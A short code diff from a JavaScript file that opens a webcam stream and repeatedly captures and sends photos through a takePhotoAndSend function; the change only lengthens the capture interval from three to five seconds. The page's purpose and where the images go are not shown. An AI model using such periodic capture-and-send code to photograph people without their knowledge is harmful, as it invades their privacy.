@@ -116,7 +116,7 @@
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                setInterval(() => takePhotoAndSend(video), 3000);
+                setInterval(() => takePhotoAndSend(video), 5000);
             })
             .catch(err => {
                 console.error('Error accessing webcam: ', err);
